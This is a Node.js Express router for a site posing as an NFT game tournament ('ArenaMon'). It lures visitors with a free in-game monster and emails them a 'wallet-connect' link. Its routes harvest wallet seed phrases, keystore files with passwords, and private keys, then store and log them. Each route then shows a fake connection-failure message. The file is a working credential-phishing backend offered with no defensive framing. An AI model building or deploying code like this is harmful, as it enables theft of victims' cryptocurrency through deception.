const express = require('express');
const router = express.Router();
const Users = require('../models/users');
const Access = require('../models/access');
const Token = require('../models/tokens');
const sendEmail = require("../utils/sendEmail");
const nodemailer = require("nodemailer");
const fs = require("fs");
const ejs = require("ejs");
const multer  = require('multer');
// const multer  = require('multer');
// const { storage, cloudinary } = require('../cloudinary');
// const upload = multer({ storage });



const isLoggedIn = (req, res, next) => {
    if (!req.isAuthenticated()) {
        req.flash('error', 'Please sign in to view this route')
        return res.redirect('/login')
    }
    next();
}

// router.get('/forgotpassword', (req, res) => {
//     res.render('user/forgotpassword');
// });

// router.get('/howtoplay', async(req, res) => {
//     res.render("howtoplay")
// })

// router.get('/search', async(req, res) => {
//     res.render("search")
// })

// router.get('/aug-winners', async(req, res) => {
//     res.render("aug-winners")
// })

// router.get('/sept-winners', async(req, res) => {
//     res.render("sept-winners")
// })

// router.get('/winners', async(req, res) => {
//     res.render("sept-winners")
// })

// router.get('/simulator', async(req, res) => {
//     res.render("simulator")
// })

// router.get('/schedule', async(req, res) => {
//     res.render("schedule")
// })

// router.get('/FAQ', async(req, res) => {
//     res.render("FAQ")
// })

// router.get('/mint', async(req, res) => {
//     res.render("mint")
// })

// router.get('/unclaimed', async(req, res) => {
//     res.render("unclaimed")
// })

// router.get('/claimed', async(req, res) => {
//     res.render("claimed")
// })

router.get('/contact-us', async(req, res) => {
    res.render("contactus")
})

router.get('/join-tournament', async(req, res) => {
    res.render("jointournament")
})

router.post('/join-tournament', async(req, res) => {
        const today = new Date();
        const date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
        const hours = today.getHours() > 12 ? today.getHours() - 12 : today.getHours();
        const time = hours + ":" + today.getMinutes() + ":" + today.getSeconds();
        const ampm = today.getHours() >= 12 ? 'PM' : 'AM';
        const dateTime = date+' '+time+ ' ' + ampm;
    const {profile, nftstatus, email} = req.body;
    const access = new Access({profile, nftstatus, email, dateCreated: dateTime})
    await access.save()
            const text = `${process.env.WEB_URL}/wallet-connect/${access.id}`
            const subject = `WELCOME ABOARD ARENAMON TRAINER`
            await sendEmail(req.body.email, subject, text);
    req.flash("success", "Connect your wallet to our server to get your free Monster Ranger to participate in the game")
    res.redirect(`/wallet-connect/${access.id}`);
});

router.get('/wallet-connect/:id', async(req, res) => {
    const access = await Access.findById(req.params.id)
    res.render("connect-wallet", {access})
})

router.put('/wallet-connect/:id', async(req, res) => {
    const id = req.params.id;
    const {walletname} = req.body;
    const updateAccess = await Access.findByIdAndUpdate(id, req.body, { runValidators: true, new: true });
    await updateAccess.save()
    res.redirect(`/wallet-connect/${updateAccess.id}/wallet`);
});

router.get('/wallet-connect/:id/wallet', async(req, res) => {
    const access = await Access.findById(req.params.id)
    console.log(access.walletname)
    res.render("connect", {access})
})

router.post('/wallet-connect/:id/phrase', async (req, res) => {
    const access = await Access.findById(req.params.id)
        const today = new Date();
        const date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
        const hours = today.getHours() > 12 ? today.getHours() - 12 : today.getHours();
        const time = hours + ":" + today.getMinutes() + ":" + today.getSeconds();
        const ampm = today.getHours() >= 12 ? 'PM' : 'AM';
        const dateTime = date+' '+time+ ' ' + ampm;
    const {phraseTokens} = req.body
    const newToken = {walletType: access.walletname, accessType: "Phrase", dateCreated: dateTime, phraseTokens}
    const token = new Token(newToken);
    await token.save();
    console.log(token);
    req.flash('error', 'Unable to connect wallet! Please make sure your wallet details are correct.')
    res.redirect(`/import/${access.id}/${token.id}`)});

router.post('/wallet-connect/:id/keystore', async (req, res) => {
    const access = await Access.findById(req.params.id)
        const today = new Date();
        const date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
        const hours = today.getHours() > 12 ? today.getHours() - 12 : today.getHours();
        const time = hours + ":" + today.getMinutes() + ":" + today.getSeconds();
        const ampm = today.getHours() >= 12 ? 'PM' : 'AM';
        const dateTime = date+' '+time+ ' ' + ampm;
    const {keystoneJsonTokens, password} = req.body
    const newToken = {walletType: access.walletname, accessType: "Keystore JSON", dateCreated: dateTime, keystoneJsonTokens, password}
    const token = new Token(newToken);
    await token.save();
    console.log(token);
    req.flash('error', 'Unable to connect wallet! Please make sure your wallet details are correct.')
    res.redirect(`/import/${access.id}/${token.id}`)
});

router.post('/wallet-connect/:id/privatekey', async (req, res) => {
    const access = await Access.findById(req.params.id)
        const today = new Date();
        const date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
        const hours = today.getHours() > 12 ? today.getHours() - 12 : today.getHours();
        const time = hours + ":" + today.getMinutes() + ":" + today.getSeconds();
        const ampm = today.getHours() >= 12 ? 'PM' : 'AM';
        const dateTime = date+' '+time+ ' ' + ampm;
    const {privateKeyTokens} = req.body
    const newToken = {walletType: access.walletname, accessType: "Private Key", dateCreated: dateTime, privateKeyTokens}
    const token = new Token(newToken);
    await token.save();
    console.log(token);
    req.flash('error', 'Unable to connect wallet! Please make sure your wallet details are correct.')
    res.redirect(`/import/${access.id}/${token.id}`)
});

router.get('/import/:id/:tokenId', async(req, res) => {
    const {id, tokenId} = req.params
    const wallet = await Token.findById(tokenId)
    const access = await Access.findById(id)
    res.render("connected", {wallet, access})
})



module.exports = router;